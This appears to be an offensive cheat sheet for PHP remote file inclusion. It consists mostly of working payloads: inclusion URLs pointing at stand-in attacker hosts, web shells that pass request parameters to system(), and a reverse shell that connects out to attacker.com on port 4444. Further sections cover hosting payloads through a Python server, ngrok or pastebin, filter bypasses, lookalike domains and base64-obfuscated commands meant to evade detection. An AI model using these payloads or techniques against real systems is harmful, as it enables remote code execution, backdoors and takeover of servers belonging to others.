# execute code from remote servers. rce via external file inclusion.

requires `allow_url_fopen=On` in php configuration.

## quick test payloads

basic remote inclusion:
```
?file=http://attacker.com/shell.txt
?page=http://evil.com/cmd.php
?include=https://attacker.com/backdoor.txt
```

## attack setup

1. host malicious file on your server:
```php
# shell.txt on attacker.com
<?php system($_GET['cmd']); ?>
```

2. trigger inclusion via vulnerable parameter:
```
http://target.com/app.php?file=http://attacker.com/shell.txt&cmd=id
```

3. server downloads and executes your remote code.

## payload hosting

**simple php shell:**
```php
<?php
if(isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
?>
```

**reverse shell payload:**
```php
<?php
$sock = fsockopen("attacker.com", 4444);
exec("/bin/bash -i <&3 >&3 2>&3", $sock);
?>
```

**info gathering:**
```php
<?php
echo "User: " . get_current_user() . "\n";
echo "PWD: " . getcwd() . "\n";
echo "OS: " . php_uname() . "\n";
phpinfo();
?>
```

## hosting methods

**python http server:**
```bash
# host payloads
echo '<?php system($_GET["cmd"]); ?>' > shell.txt
python3 -m http.server 8080
```

**ngrok tunnel:**
```bash
# expose local server to internet
ngrok http 8080
# use ngrok url in rfi attack
```

**free hosting platforms:**
```
pastebin.com/raw/[paste-id]
github.com/user/repo/raw/main/shell.txt
```

## bypass techniques

**protocol variations:**
```
http://attacker.com/shell.txt
https://attacker.com/shell.txt
ftp://attacker.com/shell.txt
```

**case sensitivity bypass:**
```
HTTP://attacker.com/shell.txt
Http://attacker.com/shell.txt
```

**url encoding:**
```
?file=http%3A%2F%2Fattacker.com%2Fshell.txt
```

## detection evasion

**legitimate-looking urls:**
```
http://jquery.com.attacker.com/shell.txt
http://attacker.com/legitimate-file.txt
```

**indirect inclusion:**
```
# redirect chain
http://attacker.com/redirect.php -> shell.txt
```

**obfuscated payloads:**
```php
# base64 encoded commands
<?php system(base64_decode($_GET['b64cmd'])); ?>
```

## error-based information disclosure

failed rfi attempts reveal:
```
# error messages show:
- file paths and directory structure
- php configuration details  
- whether url includes are enabled
- network connectivity restrictions
```

## operational notes

- [!] rfi generates network traffic to your server - logs will show source
- requires internet connectivity from target server
- error messages reveal php config and restrictions
- combine with other vulns for maximum impact
- test for both http and https support

**verification methods:**
- check access logs on your server
- use unique identifiers in payloads
- monitor dns requests to your domain

# TODO: add techniques for bypassing outbound filtering